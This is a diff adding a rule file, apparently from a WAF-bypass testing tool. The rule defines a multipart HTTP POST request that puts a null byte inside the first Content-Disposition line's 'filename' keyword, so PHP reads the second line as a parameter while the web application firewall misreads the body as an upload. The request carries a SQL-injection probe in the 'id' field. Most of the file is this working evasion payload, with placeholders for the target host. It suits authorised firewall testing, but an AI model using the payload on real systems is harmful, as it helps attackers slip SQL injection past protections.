@@ -1,0 +1,20 @@
+# @name: multipart首行CD空字节破坏
+# @tags: post,multipart,null-byte,content-disposition,php,id,bypass
+# @color: red
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_first_cd_null_break
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 双写描述行基础上，在第一行 filename 关键字中插入 \\x00 破坏该行，让 PHP 改以第二行为主(POST 参数)，WAF 仍取第一行并因 filename 误判为上传。规则文件内 \\x00 发送前还原为真实字节。参考 do9gy Part2 第1条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id"; fi\x00lename="1.png"
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
